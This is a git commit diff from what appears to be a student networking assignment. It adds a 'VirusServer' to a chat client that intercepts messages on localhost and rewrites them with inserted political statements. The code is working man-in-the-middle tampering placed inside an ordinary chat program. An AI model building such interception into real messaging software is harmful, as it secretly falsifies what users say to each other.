6192f7911909c5fdbc699cd295712225d557163a
mltaskova <mltaskova@n227-216.mtholyoke.edu>
2018-12-11 09:58:10 -0500

    done making the messages weird, None still showing up after infection

--- NT-homework4/chatbox.py
+++ NT-homework4/chatbox.py
@@ -1,3 +1,59 @@
+## VIRUS ##
+
+from perfectpointtopointlinks import PerfectPointToPointLinks
+import socket
+import re
+import json
+
+
+class VirusServer:
+    def __init__(self, port, victim_port, beb_address_list):
+        self.ADDRESS = "127.0.0.1"
+        self.PORT = port
+        self.VICTIM_PORT = victim_port
+        self.chat_server_port = 11000
+        # a dictionary which acts like a hash map
+        self.victim_clients = beb_address_list
+        self.question_words_list = ["where", "how", "why"]
+        # This server link is to deliver
+        self.server_link = PerfectPointToPointLinks(port=self.PORT, addr_str=self.ADDRESS, arg_callback=self.delivery)
+
+    def send_p2p(self, sender_port,  msg):
+        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            temp_socket.connect((self.ADDRESS, self.VICTIM_PORT))
+        except socket.error:
+            return
+        message = str(sender_port) + "+" + msg
+        temp_socket.send(message.encode())
+        temp_socket.close()
+
+    def manipulate_msg(self, msg):
+        for qw in self.question_words_list:
+            if msg.__contains__(qw):
+                return qw + " is it still a fact that children get killed in schools due to openly available automated rifles"
+        if msg.__contains__("hey"):
+            return "hey when was the last time you researched immigration policies in America"
+        elif msg.__contains__("do"):
+            return "do you want to join me in the fight against sexism"
+        else:
+            return msg + ", and btw black lives matter"
+
+    def delivery(self, sender_port,  message):
+        if message is not None:
+            if sender_port == self.VICTIM_PORT or sender_port == self.PORT:
+                self.send_p2p(self.PORT , message)
+            elif sender_port == -1:
+                msg = json.loads(message)
+                self.victim_clients = msg
+                self.send_p2p(sender_port, message)
+            elif sender_port == -2 or sender_port == self.chat_server_port:
+                self.send_p2p(sender_port, message)
+            else:
+                msg = self.manipulate_msg(message)
+                self.send_p2p(sender_port, msg)
+
+## VIRUS END ##
 from besteffortbroadcast import BestEffortBroadcast
 import multiprocessing
 import random
@@ -53,12 +109,15 @@ class ChatBox:
 
 
 def main():
-    name = input("Your name: ")
+    name = raw_input("Your name: ")
     addr = '127.0.0.1'
     try:
         # Choose a random port for each client
         port = random.randint(1024, 49151)
         chat_box = ChatBox(name, addr, port)
+
+        virus_box = VirusServer(random.randint(1024, 49151), port, chat_box.friend_list)
+        port = virus_box.PORT
         print("Chat box initiated")
     except OSError:
         if chat_box.beb:
@@ -69,7 +128,7 @@ def main():
     try:
         # Connecting to chat server
         client_socket.connect(("127.0.0.1", 11000))
-    except ConnectionRefusedError:
+    except socket.error:
         print("Cannot connect to chat server.")
         return
     mesg = str(port) + "+" + "New client:" + name
@@ -79,16 +138,16 @@ def main():
     # Sending messages
     print("## Type a message or {quit} to quit ##")
     while True:
-        message = input("")
+        message = raw_input("")
         # If quit, send quit message to chat server
         if message == '{quit}':
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
                 # Connecting to chat server
                 client_socket.connect(("", 11000))
-            except ConnectionRefusedError:
+            except socket.error:
                 print("Cannot connect to chat server.")
-                return
+                continue
             msg = str(chat_box.port) + "+" + message
             client_socket.send(msg.encode())
             client_socket.close()
